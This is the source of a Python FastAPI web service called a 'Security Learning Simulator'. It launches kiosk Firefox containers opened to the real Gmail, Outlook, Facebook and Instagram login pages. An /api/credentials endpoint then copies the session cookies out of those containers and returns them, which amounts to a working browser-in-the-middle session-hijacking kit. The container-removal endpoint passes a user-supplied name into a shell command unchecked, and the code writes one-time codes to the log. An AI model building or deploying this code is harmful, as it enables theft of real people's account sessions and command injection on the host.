import os
import json
import random
import asyncio
import logging
import subprocess
from datetime import datetime, timedelta, timezone
from dotenv import load_dotenv
from fastapi import FastAPI, Query, Header, HTTPException, Depends
from fastapi.middleware.cors import CORSMiddleware
from motor.motor_asyncio import AsyncIOMotorClient
from passlib.context import CryptContext
from jose import jwt, JWTError
from pydantic import BaseModel
from typing import Dict, Optional

load_dotenv()

MONGO_URL = os.getenv("MONGO_URL", "mongodb://localhost:27017")
SECRET_KEY = os.getenv("SECRET_KEY", "change-me-in-production")
ALGORITHM = "HS256"
ACCESS_TOKEN_EXPIRE_MINUTES = 1440

SMTP_HOST = os.getenv("SMTP_HOST", "")
SMTP_PORT = int(os.getenv("SMTP_PORT", "587"))
SMTP_USER = os.getenv("SMTP_USER", "")
SMTP_PASS = os.getenv("SMTP_PASS", "")

VPS_IP = os.getenv("VPS_IP", "127.0.0.1")
DOCKER_HOST = os.getenv("DOCKER_HOST", "")
CORS_ORIGINS = os.getenv("CORS_ORIGINS", "http://localhost:3000,http://localhost:5173").split(",")
FIREFOX_UI_PORT = os.getenv("FIREFOX_UI_PORT", "5800")
FIREFOX_VNC_PORT = os.getenv("FIREFOX_VNC_PORT", "5900")

LOG_FILE = "commands.log"

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[
        logging.FileHandler(LOG_FILE, encoding="utf-8"),
        logging.StreamHandler(),
    ],
)
logger = logging.getLogger(__name__)

pwd_ctx = CryptContext(schemes=["sha256_crypt"], deprecated="auto")
client: AsyncIOMotorClient = None
db = None

app = FastAPI(title="Security Learning Simulator")

app.add_middleware(
    CORSMiddleware,
    allow_origins=CORS_ORIGINS,
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

docker_prefix = f"export DOCKER_HOST={DOCKER_HOST} && " if DOCKER_HOST else ""
CUSTOM_FIREFOX_IMAGE = "btb_firefox"

COMMANDS = {
    "deploy": f"echo '[OK] Server deployed on {VPS_IP}:8443 — TLS handshake complete.'",
    "configure": "echo '[OK] Firewall rules applied — ports 443, 8080 open. Fail2ban active.'",
    "launch": (
        f"{docker_prefix}"
        f"docker rm -f firefox 2>/dev/null; "
        f"docker run -d --name firefox --shm-size=2g "
        f"-p {FIREFOX_UI_PORT}:5800 -p {FIREFOX_VNC_PORT}:5900 "
        f"-e ENABLE_CORS_PROXY=1 "
        f"-v firefox-config:/config "
        f"{CUSTOM_FIREFOX_IMAGE}"
    ),
}

PHISHLETS = {
    "gmail":     {"label": "Gmail",     "url": "https://gmail.com",     "port": 5801},
    "outlook":   {"label": "Outlook",   "url": "https://outlook.com",   "port": 5802},
    "facebook":  {"label": "Facebook",  "url": "https://facebook.com",  "port": 5803},
    "instagram": {"label": "Instagram", "url": "https://instagram.com", "port": 5804},
}

# --- Pydantic models ---

class RegisterRequest(BaseModel):
    name: str
    email: str
    password: str

class LoginRequest(BaseModel):
    email: str
    password: str

class VerifyOtpRequest(BaseModel):
    email: str
    otp: str

class RemoveRequest(BaseModel):
    name: str

class PhishletLaunchRequest(BaseModel):
    key: str

# --- MongoDB ---

@app.on_event("startup")
async def startup():
    global client, db
    client = AsyncIOMotorClient(MONGO_URL)
    db = client.btb_attack
    await db.users.create_index("email", unique=True)
    await run_shell(f"{docker_prefix}docker build -t btb_firefox -f /app/Dockerfile.firefox /app/ 2>&1")
    logger.info(f"Connected to MongoDB at {MONGO_URL}")

@app.on_event("shutdown")
async def shutdown():
    if client:
        client.close()

# --- JWT ---

def create_token(email: str) -> str:
    expire = datetime.now(timezone.utc) + timedelta(minutes=ACCESS_TOKEN_EXPIRE_MINUTES)
    return jwt.encode({"sub": email, "exp": expire}, SECRET_KEY, algorithm=ALGORITHM)

async def get_current_user(authorization: Optional[str] = Header(None)):
    if not authorization or not authorization.startswith("Bearer "):
        raise HTTPException(status_code=401, detail="Not authenticated")
    try:
        payload = jwt.decode(authorization.split(" ", 1)[1], SECRET_KEY, algorithms=[ALGORITHM])
        return payload["sub"]
    except JWTError:
        raise HTTPException(status_code=401, detail="Invalid or expired token")

# --- OTP helpers ---

def generate_otp() -> str:
    return str(random.randint(100000, 999999))

async def send_otp_email(email: str, otp: str):
    logger.info(f"===== OTP for {email}: {otp} =====")
    if not SMTP_HOST:
        return
    try:
        import aiosmtplib
        from email.message import EmailMessage
        msg = EmailMessage()
        msg["Subject"] = "BTB Attack — your verification code"
        msg["From"] = SMTP_USER
        msg["To"] = email
        msg.set_content(f"Your OTP is: {otp}\nIt expires in 5 minutes.")
        await aiosmtplib.send(
            msg,
            hostname=SMTP_HOST,
            port=SMTP_PORT,
            username=SMTP_USER,
            password=SMTP_PASS,
            start_tls=True,
        )
        logger.info(f"OTP also emailed to {email}")
    except Exception as e:
        logger.warning(f"SMTP failed: {e}")

# --- Auth endpoints ---

@app.post("/api/auth/register")
async def register(body: RegisterRequest):
    if len(body.password) < 4:
        raise HTTPException(status_code=400, detail="Password too short (min 4 chars)")
    existing = await db.users.find_one({"email": body.email})
    if existing:
        raise HTTPException(status_code=400, detail="Email already registered")
    hashed = pwd_ctx.hash(body.password)
    otp = generate_otp()
    await db.users.insert_one({
        "name": body.name,
        "email": body.email,
        "password": hashed,
        "verified": False,
        "otp": otp,
        "otp_expires": datetime.now(timezone.utc) + timedelta(minutes=5),
    })
    await send_otp_email(body.email, otp)
    return {"message": "OTP sent to email"}

@app.post("/api/auth/verify-otp")
async def verify_otp(body: VerifyOtpRequest):
    user = await db.users.find_one({"email": body.email})
    if not user:
        raise HTTPException(status_code=404, detail="User not found")
    if user.get("verified"):
        raise HTTPException(status_code=400, detail="Already verified")
    if user.get("otp") != body.otp:
        raise HTTPException(status_code=400, detail="Invalid OTP")
    if user.get("otp_expires") and user["otp_expires"].replace(tzinfo=timezone.utc) < datetime.now(timezone.utc):
        raise HTTPException(status_code=400, detail="OTP expired")
    await db.users.update_one({"email": body.email}, {"$set": {"verified": True}, "$unset": {"otp": "", "otp_expires": ""}})
    token = create_token(body.email)
    user_data = await db.users.find_one({"email": body.email}, {"name": 1, "email": 1})
    return {"token": token, "email": body.email, "name": user_data["name"]}

@app.post("/api/auth/resend-otp")
async def resend_otp(body: VerifyOtpRequest):
    user = await db.users.find_one({"email": body.email})
    if not user:
        raise HTTPException(status_code=404, detail="User not found")
    if user.get("verified"):
        raise HTTPException(status_code=400, detail="Already verified")
    otp = generate_otp()
    await db.users.update_one(
        {"email": body.email},
        {"$set": {"otp": otp, "otp_expires": datetime.now(timezone.utc) + timedelta(minutes=5)}},
    )
    await send_otp_email(body.email, otp)
    return {"message": "OTP resent"}

@app.post("/api/auth/login")
async def login(body: LoginRequest):
    user = await db.users.find_one({"email": body.email})
    if not user or not pwd_ctx.verify(body.password, user["password"]):
        raise HTTPException(status_code=401, detail="Invalid credentials")
    if not user.get("verified"):
        raise HTTPException(status_code=403, detail="Email not verified")
    token = create_token(body.email)
    return {"token": token, "email": body.email, "name": user["name"]}

@app.get("/api/auth/verify")
async def verify(email: str = Depends(get_current_user)):
    user = await db.users.find_one({"email": email}, {"name": 1, "email": 1})
    if not user:
        raise HTTPException(status_code=401, detail="User not found")
    return {"valid": True, "email": user["email"], "name": user["name"]}

# --- Shell runner ---

async def run_shell(cmd: str) -> Dict[str, str]:
    logger.info(f"$ {cmd}")
    loop = asyncio.get_running_loop()
    proc = await loop.run_in_executor(
        None,
        lambda: subprocess.run(cmd, shell=True, capture_output=True, text=True),
    )
    out = (proc.stdout or "").strip()
    err = (proc.stderr or "").strip()
    combined = "\n".join(filter(None, [out, err]))
    if proc.returncode == 0:
        logger.info(f"-> {combined}")
        return {"status": "success", "message": combined or "[OK] Done."}
    else:
        logger.error(f"!! exit {proc.returncode}: {combined}")
        return {"status": "error", "message": combined or f"Command failed (code {proc.returncode})"}

# --- Protected endpoints ---

@app.get("/api/deploy")
async def deploy_server(email: str = Depends(get_current_user)):
    logger.info(f"{email} ran deploy")
    return await run_shell(COMMANDS["deploy"])

@app.get("/api/configure")
async def configure(email: str = Depends(get_current_user)):
    logger.info(f"{email} ran configure")
    return await run_shell(COMMANDS["configure"])

@app.get("/api/launch")
async def launch(email: str = Depends(get_current_user)):
    logger.info(f"{email} ran launch")
    result = await run_shell(COMMANDS["launch"])
    if result["status"] == "success":
        cid = result["message"][:12]
        result["message"] += (
            f"\n\n  Firefox is running!\n"
            f"  ├── UI  → http://{VPS_IP}:{FIREFOX_UI_PORT}\n"
            f"  └── VNC → http://{VPS_IP}:{FIREFOX_VNC_PORT}\n"
            f"\n  Container ID: {cid}"
        )
    return result

@app.get("/api/logs")
async def get_logs(email: str = Depends(get_current_user), lines: int = Query(50, le=500)):
    try:
        with open(LOG_FILE, "r", encoding="utf-8") as f:
            all_lines = f.readlines()
    except FileNotFoundError:
        return {"status": "success", "message": "(no log file yet)"}
    tail = all_lines[-lines:]
    return {"status": "success", "message": "".join(tail).rstrip()}

@app.get("/api/containers")
async def list_containers(email: str = Depends(get_current_user)):
    fmt = "'{{.Names}}|{{.ID}}|{{.Image}}|{{.Status}}'"
    result = await run_shell(f"{docker_prefix}docker ps --format {fmt} 2>&1")
    if result["status"] == "error":
        logger.warning(f"docker ps failed: {result['message']}")
        return {"containers": [], "error": result["message"]}
    containers = []
    for line in result["message"].split("\n"):
        parts = line.strip().split("|")
        if len(parts) == 4:
            containers.append({
                "name": parts[0], "id": parts[1][:12],
                "image": parts[2], "status": parts[3],
            })
    return {"containers": containers}

@app.post("/api/containers/remove")
async def remove_container(body: RemoveRequest, email: str = Depends(get_current_user)):
    return await run_shell(f"{docker_prefix}docker rm -f {body.name}")

@app.get("/api/phishlets")
async def list_phishlets(email: str = Depends(get_current_user)):
    fmt = "'{{.Names}}|{{.ID}}|{{.Image}}|{{.Status}}'"
    result = await run_shell(f"{docker_prefix}docker ps --format {fmt} 2>&1")
    running = {}
    if result["status"] == "success":
        for line in result["message"].split("\n"):
            parts = line.strip().split("|")
            if len(parts) == 4:
                running[parts[0]] = {"id": parts[1][:12], "status": parts[3], "image": parts[2]}

    phishlets = []
    for key, cfg in PHISHLETS.items():
        name = f"phishlet-{key}"
        rc = running.get(name)
        phishlets.append({
            "key": key,
            "label": cfg["label"],
            "name": name,
            "url": cfg["url"],
            "port": cfg["port"],
            "running": rc is not None,
            "container_id": rc["id"] if rc else "",
            "status": rc["status"] if rc else "",
        })
    return {"phishlets": phishlets}

@app.post("/api/phishlets/launch")
async def launch_phishlet(body: PhishletLaunchRequest, email: str = Depends(get_current_user)):
    if body.key not in PHISHLETS:
        raise HTTPException(status_code=400, detail=f"Unknown phishlet: {body.key}")
    p = PHISHLETS[body.key]
    container_name = f"phishlet-{body.key}"
    cmd = (
        f"{docker_prefix}"
        f"docker rm -f {container_name} 2>/dev/null; "
        f"docker run -d --name {container_name} --shm-size=2g "
        f"-p {p['port']}:5800 "
        f"-e FF_OPEN_URL=\"{p['url']}\" "
        f"-e FF_KIOSK=1 "
        f"-v {container_name}-config:/config "
        f"{CUSTOM_FIREFOX_IMAGE}"
    )
    result = await run_shell(cmd)
    if result["status"] == "success":
        cid = result["message"][:12]
        result["message"] += (
            f"\n\n  {p['label']} phishlet running!\n"
            f"  └── UI  → http://{VPS_IP}:{p['port']}\n"
            f"\n  Container ID: {cid}"
        )
    return result

@app.get("/api/credentials")
async def get_credentials(
    target: str = "",
    email: str = Depends(get_current_user)
):
    list_result = await run_shell(
        f"{docker_prefix}docker ps "
        f"--filter name=^/firefox$ --filter name=^/phishlet- "
        f"--format '{{{{.Names}}}}|{{{{.ID}}}}' 2>&1"
    )
    if list_result["status"] != "success":
        return {"status": "error", "message": "Failed to list containers"}

    entries = list_result["message"].strip().split("\n")
    entries = [e.strip() for e in entries if e.strip()]
    if not entries:
        return {"status": "error", "message": "No browser containers running"}

    if target:
        entries = [e for e in entries if e.split("|", 1)[0] == target]
        if not entries:
            return {"status": "error", "message": f"No container found with name '{target}'"}

    output = []
    for entry in entries:
        parts = entry.split("|", 1)
        name = parts[0]
        cookie_paths = await run_shell(
            f"{docker_prefix}docker exec {name} sh -c "
            f"\"find /config -name 'cookies.sqlite' -type f -maxdepth 4 2>/dev/null\""
        )
        if cookie_paths["status"] != "success" or not cookie_paths["message"].strip():
            output.append(f"{name}\n{{}}")
            continue

        lines = []
        for path in cookie_paths["message"].strip().split("\n"):
            path = path.strip()
            if not path:
                continue
            data = await run_shell(
                f"{docker_prefix}docker exec {name} sh -c "
                f"\"cp '{path}' /tmp/cookies.sqlite && "
                f"sqlite3 /tmp/cookies.sqlite "
                f"'SELECT host, name, value FROM moz_cookies ORDER BY host' && "
                f"rm /tmp/cookies.sqlite\" 2>&1"
            )
            if data["status"] == "success" and data["message"].strip():
                lines.append(data["message"])

        if lines:
            rows = []
            for line in "\n".join(lines).split("\n"):
                line = line.strip()
                if "|" in line:
                    parts = line.split("|", 2)
                    if len(parts) == 3:
                        rows.append(tuple(parts))
            rows.sort(key=lambda r: (r[0], r[1]))
            if target:
                container_obj = {}
                for host, ck_name, ck_val in rows:
                    container_obj.setdefault(host, {})[ck_name] = ck_val
                return {"status": "success", "message": f"{name}\n{json.dumps(container_obj, indent=2)}"}
            container_obj = {}
            for host, cname, cval in rows:
                container_obj.setdefault(host, {})[cname] = cval
            output.append(f"{name}\n{json.dumps(container_obj, indent=2)}")
        else:
            output.append(f"{name}\n{{}}")

    return {"status": "success", "message": "\n\n".join(output)}

@app.get("/api/health")
async def health():
    return {"status": "ok"}
